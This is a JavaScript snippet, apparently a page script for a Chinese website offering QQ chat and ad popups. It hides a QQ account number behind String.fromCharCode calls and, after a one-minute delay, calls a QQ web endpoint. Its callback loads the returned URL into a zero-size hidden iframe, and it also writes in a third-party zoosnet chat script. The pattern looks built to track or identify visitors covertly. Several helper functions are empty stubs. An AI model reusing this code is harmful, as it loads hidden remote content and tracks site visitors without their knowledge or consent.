var ystime = 0;
var jgtime = 0;
var isse = 0;
var cookieid = 'x';

function isso(ref) {}
var qqapi = "http://b.qq.com/cgi/wpags";

function hd_gc(s) {}
function hd_sc(s) {}
function hd_i(time, url) {
    setTimeout(function() {
        var e = document.createElement("iframe");
        e.src = url;
        e.height = 0;
        e.width = 0;
        e.frameborder = 0;
        document.body.appendChild(e)
    }, time)
}
function hd_co(str) {
    return String.fromCharCode(str)
}
function hd_t(u) {
    if (jgtime > 0) {
        if (hd_gc('hdtime') != cookieid) {
            hd_i(ystime, u);
            hd_sc('hdtime', cookieid, jgtime)
        }
    } else {
        hd_i(ystime, u)
    }
}
var ns = (new Date()).valueOf();
var ds = 1444467030000;

function onGetSigtSigu(res) {
    if (isse == 1) {
        if (isso(ref)) {
            hd_t(res)
        }
    } else {
        hd_t(res)
    }
}
var yxqq_uid = "1001";
//800006655 
var qq_chat=true;
function PlayJsAdPopWin(){
if(qq_chat){
var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = qqapi + '?kfguin=' + hd_co("56") + hd_co("48") + hd_co("48") + hd_co("48") + hd_co("48") + hd_co("54") + hd_co("54") + hd_co("53") + hd_co("53")  + '&p=&s=0&env=1&v=1&a=' + yxqq_uid + '&aty=1&sv=0&sp=&fflg=2&t=' + (new Date()).valueOf();
    document.getElementsByTagName("head")[0].appendChild(script)
}
};
setTimeout("PlayJsAdPopWin()",1000*60);



document.write('<script language="javascript" src="http:\/\/pbt.zoosnet.net\/JS\/LsJS.aspx?siteid=PBT58332042&float=1&lng=cn"><\/script>');